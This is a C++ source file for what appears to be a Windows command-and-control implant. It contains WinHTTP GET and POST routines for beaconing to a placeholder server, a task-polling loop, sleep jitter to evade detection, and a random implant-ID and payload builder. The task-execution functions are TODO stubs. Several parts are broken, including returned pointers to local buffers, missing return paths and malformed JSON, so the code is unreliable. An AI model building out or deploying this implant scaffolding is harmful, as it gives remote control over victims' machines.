/**post request, try initial communcation with c2, when working->
every 10 secs check for tasks->if tasks exit dispatch->append to dictionary->post to payload**/
#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <iostream>
#include <windows.h>
#include <winhttp.h>
#include <future> 
#define SERVERNAME "placeholder"
#define SLEEP 60000

size_t writeFunction(void *ptr, size_t size, size_t nmemb, std::string *data)
{
    data->append((char *)ptr, size * nmemb);
    return size * nmemb;
}

void tasks()
{
    while (1)
    {
        Sleep(SLEEP);
    }
}
LPSTR makeGetRequest(LPCWSTR servername, LPCWSTR subdirectory){
    HINTERNET httpsession = WinHttpOpen(
        L"GenericAPICaller",
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);
    if(httpsession!=NULL){
        HINTERNET connectsesh = WinHttpConnect(
            httpsession,
            servername,
            INTERNET_DEFAULT_HTTPS_PORT,
            0);
        if (connectsesh != NULL)
        {
            HINTERNET request = WinHttpOpenRequest(
                connectsesh,
                L"GET",
                subdirectory,
                NULL,
                WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES,
                WINHTTP_FLAG_SECURE);
            if (request != NULL)
            {
                BOOL idrequest = WinHttpSendRequest(
                    request,
                    WINHTTP_NO_ADDITIONAL_HEADERS,
                    0,
                    NULL,
                    0,
                    0,
                    0);
                if (idrequest == TRUE)
                {
                    BOOL response = WinHttpReceiveResponse(
                        request,
                        NULL);
                    if(response==true)
                    {
                        DWORD bytesneeded;
                        BOOL query= WinHttpQueryDataAvailable(
                        request,
                        &bytesneeded);
                        LPSTR returnbuffer=new char[bytesneeded+1];
                        if(query==TRUE){
                            if(returnbuffer){
                                ZeroMemory(returnbuffer, bytesneeded+1);
                                BOOL dataread=WinHttpReadData(
                                request,
                                returnbuffer,
                                bytesneeded+1,
                                NULL);
                                if(dataread==TRUE){
                                    return returnbuffer;
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}


//TODO
auto getTasks(){

return 1;
}


//TODO
auto parseTasks(auto toParse){

return 1;
}

//TODO
auto executeTasks(auto tasks){
    
    return 1;
}

void runLoop(bool isRunning){
    while (isRunning) {
        try {
            const auto serverResponse = std::async(std::launch::async, getTasks);
            auto parsedTasks = parseTasks(serverResponse.get());
            auto success = executeTasks(parsedTasks);
        }
        catch (const std::exception& e) {
            printf("\nError in runLoop: %s\n", e.what());
        }

        //SET SLEEP HERE 
    }

}

LPSTR makePostRequest(LPCWSTR servername, LPCWSTR subdirectory, const char *postdata)
{
    DWORD datalen = strlen(postdata);
    HINTERNET httpsession = WinHttpOpen(
        L"GenericAPICaller",
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);
    if (httpsession != NULL)
    {
        HINTERNET connectsesh = WinHttpConnect(
            httpsession,
            servername,
            INTERNET_DEFAULT_HTTPS_PORT,
            0);
        if (connectsesh != NULL)
        {
            HINTERNET request = WinHttpOpenRequest(
                connectsesh,
                L"POST",
                subdirectory,
                NULL,
                WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES,
                WINHTTP_FLAG_SECURE);
            if (request != NULL)
            {
                BOOL idrequest = WinHttpSendRequest(
                    request,
                    WINHTTP_NO_ADDITIONAL_HEADERS,
                    0,
                    (LPVOID)postdata,
                    datalen,
                    datalen,
                    0);
                if (idrequest == TRUE)
                {
                    BOOL response = WinHttpReceiveResponse(
                        request,
                        NULL);
                    if (response == true)
                    {
                        DWORD bytesneeded;
                        BOOL query = WinHttpQueryDataAvailable(
                            request,
                            &bytesneeded);
                        LPSTR returnbuffer = new char[bytesneeded + 1];
                        if (query == TRUE)
                        {
                            if (returnbuffer)
                            {
                                ZeroMemory(returnbuffer, bytesneeded + 1);
                                BOOL dataread = WinHttpReadData(
                                    request,
                                    returnbuffer,
                                    bytesneeded + 1,
                                    NULL);
                                if (dataread == TRUE)
                                {
                                    return returnbuffer;
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}

int sendresults()
{
    while (1)
    {
        //create jitter from 0 to 5 mins 
        int jitter;
        jitter=rand()*10; 
        Sleep(SLEEP+jitter);
        // Send results, check response
        // If good response break
    }
}

// Random Implant ID in hex using rand()
// https://stackoverflow.com/questions/33325814/how-to-loop-generate-random-256bit-hex-in-c-or-c
char *random_id()
{
    char random_hex[32 + 1];
    char *random_hexptr = random_hex;

    srand(time(0));
    for (int i = 0; i < 32; i++)
    {
        sprintf(random_hex + i, "%x", rand() % 32);
    }

    return random_hexptr;
}

char *make_base_payload(char *implant_id)
{
    char payload[51] = "{\"implant_id\": }";
    char *payloadptr = payload;
    strcat(payload, implant_id);
    return payloadptr;
}

int main(int argc, char *argv[])
{
    runLoop(true);
    return 0;
}
